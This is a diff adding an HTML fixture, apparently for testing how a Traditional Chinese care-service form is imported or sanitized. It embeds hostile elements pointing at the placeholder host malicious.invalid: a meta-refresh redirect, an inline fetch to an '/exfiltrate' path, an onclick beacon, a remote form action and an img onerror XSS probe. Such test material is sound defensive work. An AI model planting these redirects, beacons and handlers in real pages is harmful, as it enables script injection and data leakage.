@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="zh-Hant">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="refresh" content="0;url=https://malicious.invalid/redirect">
+    <link rel="stylesheet" href="https://malicious.invalid/theme.css">
+    <script>fetch("https://malicious.invalid/exfiltrate")</script>
+  </head>
+  <body>
+    <form action="https://malicious.invalid/submit" onsubmit="return false">
+      <h5 id="ca100Form3-header">
+        需要服務者基本資料
+        <button type="button" onclick="fetch('https://malicious.invalid/click')">勾選後此區不列印</button>
+      </h5>
+      <div id="ca100Form3-body">
+        <table>
+          <tr><th>個案姓名</th><td>測試個案</td></tr>
+          <tr><th>服務狀態</th><td>使用中</td></tr>
+        </table>
+        <input type="hidden" name="csrf" value="must-not-import">
+        <img src="https://malicious.invalid/pixel.gif" onerror="alert(1)" alt="">
+      </div>
+      <h5>未發布的自訂區段</h5>
+      <table><tr><th>自訂欄位</th><td>保留待映射</td></tr></table>
+    </form>
+  </body>
+</html>
